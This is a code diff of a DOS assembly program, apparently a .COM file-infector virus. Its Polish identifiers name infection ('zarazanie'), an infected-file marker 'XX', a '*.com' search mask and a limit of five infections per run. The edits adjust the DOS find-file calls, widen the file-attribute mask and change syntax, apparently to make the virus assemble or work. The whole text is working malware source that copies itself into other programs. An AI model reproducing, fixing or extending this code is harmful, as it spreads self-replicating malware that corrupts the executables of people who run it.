@@ -1,6 +1,6 @@
 format binary
 
-P21H_PLIK_SZUKAJ_MASKA equ 4eh
+P21H_PLIK_SZUKAJ_MASKA equ 4e00h
 P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
 P21H_PLIK_OTWORZ equ 3dh
 P21H_PLIK_ODCZYTAJ equ 3fh
@@ -11,7 +11,7 @@ P21H_PLIK_WSKAZNIK_KONIEC equ 02h
 P21H_PLIK_TRYB_ODCZYT equ 0h
 P21H_P_TRYB_ODCZYT_ZAPIS equ 2h
 
-PLIK_ATRYBUTY equ 7h
+PLIK_ATRYBUTY equ 0fh
 ZARAZONY_MASKA equ 'XX'
 ZARAZENIE_PLIK_LICZBA equ 5h
 
@@ -37,7 +37,7 @@ przesuniecie:
   lea dx, [bp + plik_maska]
   cmp [bp + licznik], ZARAZENIE_PLIK_LICZBA
   ja plik_zarazanie_koniec
-  mov ah, P21H_PLIK_SZUKAJ_MASKA
+  mov ax, P21H_PLIK_SZUKAJ_MASKA
   mov cx, PLIK_ATRYBUTY
 plik_szukaj:
   int 21h
@@ -46,7 +46,7 @@ plik_szukaj:
   mov ax, P21H_PLIK_SZUKAJ_NASTEPNEGO
   jmp plik_szukaj
 plik_zarazanie_koniec:
-  ret
+  retn
   
 zarazanie:
 ; odczytanie nagłówka zarażanego pliku
@@ -112,7 +112,7 @@ plik_otworz:
 plik_maska db "*.com", 0h
 plik_poczatek db 0cdh, 20h, 0, 0, 0
 licznik db 0h
-bufor db 1ah dup ?
+bufor: times 1ah db ?
 
 plik_koniec:
 
